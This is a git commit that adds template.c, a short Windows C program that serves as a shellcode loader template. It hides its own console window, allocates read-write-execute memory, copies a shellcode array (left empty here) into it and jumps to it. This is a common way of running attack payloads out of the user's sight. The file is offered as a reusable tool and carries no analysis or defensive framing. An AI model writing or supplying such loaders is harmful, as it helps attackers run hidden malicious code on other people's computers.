6c3c22612916edbf69589a24adeec40fd2fbb329
G1ft3dC0d3 <52042546+G1ft3dC0d3@users.noreply.github.com>
2019-07-20 17:17:59 +0200

    Create template.c

---
+++ template.c
@@ -0,0 +1,13 @@
+#include <windows.h>
+
+int main(int argc, char **argv) {
+	char shellcode[] = {
+
+};
+
+	HWND hWnd = GetConsoleWindow();
+	ShowWindow(hWnd, SW_HIDE);
+	void *exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	memcpy(exec, shellcode, sizeof shellcode);
+	((void(*)())exec)();
+}
